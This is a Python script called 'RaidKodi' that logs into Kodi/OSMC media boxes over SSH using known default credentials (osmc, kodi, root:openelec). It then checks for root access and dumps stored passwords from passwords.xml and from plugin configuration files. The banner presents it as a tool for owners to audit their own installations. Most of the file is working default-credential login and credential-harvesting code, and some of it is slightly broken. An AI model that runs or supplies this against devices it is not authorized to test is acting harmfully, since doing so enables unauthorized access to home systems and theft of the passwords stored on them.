#!/usr/bin/env python

import paramiko
from contextlib import contextmanager

print """
8888888b.           d8b      888      888    d8P   .d88888b.  8888888b. 8888888
888   Y88b          Y8P      888      888   d8P   d88P" "Y88b 888  "Y88b  888
888    888                   888      888  d8P    888     888 888    888  888
888   d88P  8888b.  888  .d88888      888d88K     888     888 888    888  888
8888888P"      "88b 888 d88" 888      8888888b    888     888 888    888  888
888 T88b   .d888888 888 888  888      888  Y88b   888     888 888    888  888
888  T88b  888  888 888 Y88b 888      888   Y88b  Y88b. .d88P 888  .d88P  888
888   T88b "Y888888 888  "Y88888      888    Y88b  "Y88888P"  8888888P" 8888888

-------------------------------------------------------------------------------
             Raid a KODI installation for Usernames and Passwords
-------------------------------------------------------------------------------
     Designed to validate the security of your Kodi or OSMC installations.
   Please do not use this software for accessing Kodi systems you do not own.
                Author: James McLean <james.mclean@gmail.com> 
-------------------------------------------------------------------------------
"""

class RaidKodi:

    host = None 
    ssh = None

    creds = [
        {'username': 'osmc','password': 'osmc'},
        {'username': 'kodi','password': 'kodi'},
        {'username': 'root','password': 'openelec'}
    ]

    def setHost(self, host):
        self.host = host

    def check(self):
        print "Inspecting host " + self.host

        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for cred in self.creds:
            try:
                self.ssh.connect(self.host, username=cred['username'], password=cred['password'])
                print "DEFAULT CREDS FOUND: " + self.host + " USERNAME: " + cred['username'] + " PASSWORD: " + cred['password']
                break
            except:
                print "Host: " + self.host + " authentication failed with " + cred['username'] + ":" + cred['password'];

        self.hostDetail()
        self.raid()

    def hostDetail(self):
        cmd = self.runCommand('hostname')
        for c in cmd:
            print "Hostname: " , c

    def raid(self):

        print "What's our access level?"
        data = self.runCommand('id;whoami');
        for line in data:
            if "root" in line:
                print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
                print "!!!WARNING: ROOT ACCESS GRANTED!!!!"
                print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            print line.strip('\n');

        print "Raiding host for credentials"
        print "Main password file:"
        data = self.runCommand('cat ~/.kodi/userdata/passwords.xml');
        for line in data:
            print line.strip('\n')
       
        print "Plugin config username/passwords: "
        data = self.runCommand('grep -R -E \'username|password\' ~/.kodi/userdata/*');
        for line in data:
            print line.strip('\n')

    def runCommand(self, command):
        try:
            stdin, stdout, stderr = self.ssh.exec_command(command)
        except:
            print "Error running command: " . stderr
        return stdout

    def disconnect():
        self.ssh.disconnect()

    def run(self):
        self.check()


raid = RaidKodi()
raid.setHost('192.168.1.254')
raid.run()

"""
host = '192.168.1.4'

def create_ssh(host=host, username=username, password=password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
    try:
       print "creating connection"
       ssh.connect(host, username=username, password=password)
       print "connected"
       yield ssh
    finally:
       print "closing connection"
       ssh.close()
       print "closed"

create_ssh(host, username, password)
"""
